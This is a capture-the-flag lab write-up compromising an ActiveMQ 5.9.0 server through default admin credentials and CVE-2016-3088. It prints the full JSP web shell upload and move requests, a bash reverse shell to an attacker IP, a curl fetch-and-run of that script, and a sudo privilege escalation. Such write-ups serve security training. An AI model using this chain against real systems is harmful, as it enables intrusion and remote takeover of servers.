##Broker

#Enumeration
```
# Nmap 7.91 scan initiated Sun Mar 14 16:17:40 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 22,1883,8161,33559 10.10.5.130
Nmap scan report for 10.10.5.130
Host is up, received echo-reply ttl 61 (0.15s latency).
Scanned at 2021-03-14 16:17:41 PDT for 83s

PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4c:75:a0:7b:43:87:70:4f:70:16:d2:3c:c4:c5:a4:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0E0J6enJ0afxy700qSiIX5MtF1OnZao36BxMDHd4z3X/fbRQc3WOsCzY9KsTw7RltG4bSBJGja3ppRbiLTowv+2aunR3nKPaR/Rea1NFCHPxonnYutUyqPsJIRnm+oV+hqd/rvn/BgLpdNo2bpWG1PG3gNVwmbuUqybL9XF3KoZz8gj6zZPJ+RV8yrM17R2bd1J7YgTMJBKSuKyzVQZJQHJMhdBLBOfVmF3PgajXe2Dm10xbL2rQ3Zsbbuk6hhc4Ypq1LYeZ1PA0aNuHoMzhjXlYQ3XElD5Rzr6rBo5LJr2VD2Y3mo86wyM6OZBb+B88Law3RJ4fwtjVgEoa2KX0F
|   256 f4:62:b2:ad:f8:62:a0:91:2f:0a:0e:29:1a:db:70:e4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyqJ0DAEyEKxeir3lNhPLTZNtDo/CfpLAKWpiSxZUd8NJIrcsNod31Tl+KSwMvNjNvW2ilD1YYxnO2A3FDApqg=
|   256 92:d2:87:7b:98:12:45:93:52:03:5e:9e:c7:18:71:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqDlHwUjvqNDfhowAQHQMu7A/HVUijCXkxdkgpF/pSe
1883/tcp  open  mqtt?      syn-ack ttl 61
|_mqtt-subscribe: The script encountered an error: ssl failed
8161/tcp  open  http       syn-ack ttl 61 Jetty 7.6.9.v20130131
|_http-favicon: Unknown favicon MD5: 05664FB0C7AFCD6436179437E31F3AA6
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: Jetty(7.6.9.v20130131)
|_http-title: Apache ActiveMQ
33559/tcp open  tcpwrapped syn-ack ttl 61
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 14 16:19:04 2021 -- 1 IP address (1 host up) scanned in 83.63 seconds
```

#Http Server Port 8161
This is running ActiveMQ and has a login panel via Manage ActiveMQ broker link. Attempted to use default credentials and found that admin:admin allows access. We find the version running is quite out of date so lets look for an exploit
```
# searchsploit activemq 5.9.0
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
ActiveMQ < 5.14.0 - Web Shell Upload (Metasploit)                                     | java/remote/42283.rb
-------------------------------------------------------------------------------------- ---------------------------------
```
This exploit has a metasploit module and corresponds to CVE-2016-3088, which leverages an HTTP PUT method to upload a webshell and gain a foothold on the system.We find the following article though to complete this more manually
https://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30

We try and put the following jsp webshell,https://github.com/tennc/webshell/blob/master/jsp/test.jsp
```
PUT /fileserver/test.jsp HTTP/1.1
Host: 10.10.5.130:8161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
cookie: JSESSIONID=1sd10clrjxccpnpfw7y3nmhk9
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 456

1234<%@ page contentType="text/html; charset=GBK" %>
<%@ page import="java.io.*" %> <% String cmd = request.getParameter("cmd"); String output = ""; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s +"\r\n"; } } catch(IOException e) { e.printStackTrace(); } } 
out.println(output);%>
```
We can then verify it was uploaded with a get request
```
GET /fileserver/test.jsp HTTP/1.1
Host: 10.10.5.130:8161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
cookie: JSESSIONID=1sd10clrjxccpnpfw7y3nmhk9
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 456

1234<%@ page contentType="text/html; charset=GBK" %>
<%@ page import="java.io.*" %> <% String cmd = request.getParameter("cmd"); String output = ""; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s +"\r\n"; } } catch(IOException e) { e.printStackTrace(); } } 
out.println(output);%>
```
```
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Type: text/html
Content-Length: 456
Last-Modified: Mon, 15 Mar 2021 00:03:43 GMT
Connection: close
Server: Jetty(7.6.9.v20130131)

1234<%@ page contentType="text/html; charset=GBK" %>
<%@ page import="java.io.*" %> <% String cmd = request.getParameter("cmd"); String output = ""; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s +"\r\n"; } } catch(IOException e) { e.printStackTrace(); } } 
out.println(output);%>
```
So it uploaded, but we can't execute it, this is where the second part of the exploit comes in to allows us to move the file to an actual absolute path through a leak we can view with the following
```
PUT /fileserver/%80/%80 HTTP/1.1
Host: 10.10.5.130:8161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
cookie: JSESSIONID=1sd10clrjxccpnpfw7y3nmhk9
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 8

test
```
```
HTTP/1.1 500 /opt/apache-activemq-5.9.0/webapps/fileserver// (No such file or directory)
Connection: close
Server: Jetty(7.6.9.v20130131)
```
We can then use this absolute path to move our file to the admin section where it will have execute permission
```
MOVE /fileserver/test.jsp HTTP/1.1
Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/test.jsp
Host: 10.10.5.130:8161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
cookie: JSESSIONID=1sd10clrjxccpnpfw7y3nmhk9
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 0
```
A get request will confirm we have successfully moved the webshell
```
GET /admin/test.jsp HTTP/1.1
Host: 10.10.5.130:8161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
cookie: JSESSIONID=1sd10clrjxccpnpfw7y3nmhk9
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=GBK
Connection: close
Server: Jetty(7.6.9.v20130131)

...
```
We can now add the cmd parameter and have RCE
```
GET /admin/test.jsp?cmd=ls+-la HTTP/1.1
Host: 10.10.5.130:8161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
cookie: JSESSIONID=1sd10clrjxccpnpfw7y3nmhk9
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
```
1234
 total 9984
drwxr-sr-x 1 activemq activemq     4096 Dec 26 04:45 .
drwxr-xr-x 1 root     root         4096 Dec 25 18:16 ..
-rw-r--r-- 1 activemq activemq    40580 Oct 14  2013 LICENSE
-rw-r--r-- 1 activemq activemq     3334 Oct 14  2013 NOTICE
-rw-r--r-- 1 activemq activemq     2610 Oct 14  2013 README.txt
-rwxr-xr-x 1 activemq activemq 10105484 Oct 14  2013 activemq-all-5.9.0.jar
drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:17 bin
-rw-rw-r-- 1 activemq activemq     1443 Dec 25 17:50 chat.py
drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:16 conf
drwxr-xr-x 1 activemq activemq     4096 Dec 26 04:45 data
-rw-r--r-- 1 activemq activemq       23 Dec 25 18:16 flag.txt
drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:16 lib
-r-x------ 1 activemq activemq      143 Dec 25 17:50 start.sh
-rw-rw-r-- 1 activemq activemq      768 Dec 25 17:50 subscribe.py
drwxr-sr-x 5 activemq activemq     4096 Mar 14 23:15 tmp
drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:17 webapps
```
Let upload a bash one liner as a shell script and then try and get a shell connection via this RCE
```
cat shell.sh
bash -c "bash -i >& /dev/tcp/10.13.1.12/4242 0>&1"
``
Host a webserver and curl for the file
```
http://10.10.5.130:8161/admin/test.jsp?cmd=curl+10.13.1.12%3a8000/shell.sh+-o+shell.sh
```
set up our listener and run it with bash shell.sh
```
http://10.10.5.130:8161/admin/test.jsp?cmd=bash+shell.sh
```
We get a reverse shell back and can find the user flag
```
# nc -nlvp 4242                                                                                 
listening on [any] 4242 ...
connect to [10.13.1.12] from (UNKNOWN) [10.10.5.130] 42380
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
activemq@activemq:/opt/apache-activemq-5.9.0$ ls -la
ls -la
total 9988
drwxr-sr-x 1 activemq activemq     4096 Mar 15 00:31 .
drwxr-xr-x 1 root     root         4096 Dec 25 18:16 ..
-rw-r--r-- 1 activemq activemq    40580 Oct 14  2013 LICENSE
-rw-r--r-- 1 activemq activemq     3334 Oct 14  2013 NOTICE
-rw-r--r-- 1 activemq activemq     2610 Oct 14  2013 README.txt
-rwxr-xr-x 1 activemq activemq 10105484 Oct 14  2013 activemq-all-5.9.0.jar
drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:17 bin
-rw-rw-r-- 1 activemq activemq     1443 Dec 25 17:50 chat.py
drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:16 conf
drwxr-xr-x 1 activemq activemq     4096 Dec 26 04:45 data
-rw-r--r-- 1 activemq activemq       23 Dec 25 18:16 flag.txt
drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:16 lib
-rw-r--r-- 1 activemq activemq       51 Mar 15 00:31 shl.sh
-r-x------ 1 activemq activemq      143 Dec 25 17:50 start.sh
-rw-rw-r-- 1 activemq activemq      768 Dec 25 17:50 subscribe.py
drwxr-sr-x 5 activemq activemq     4096 Mar 14 23:15 tmp
drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:17 webapps
```
We can also find what Paul and Max have been talking about in chat.py, and find the following after trying to sudo -l
```
activemq@activemq:/opt/apache-activemq-5.9.0$ sudo -l
sudo -l
Matching Defaults entries for activemq on activemq:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```
We can exectute subscribe.py as root with no password and furthermore are the activemq user and can directly edit this file so we do the following edit at the beginning of the file
```
import paho.mqtt.client as mqtt
import os

os.system("bash")
```
this will immediately drop us onto a root shell upon running
```
activemq@activemq:/opt/apache-activemq-5.9.0$ sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
root@activemq:/opt/apache-activemq-5.9.0#
```
we can then find the root flag in the root directory.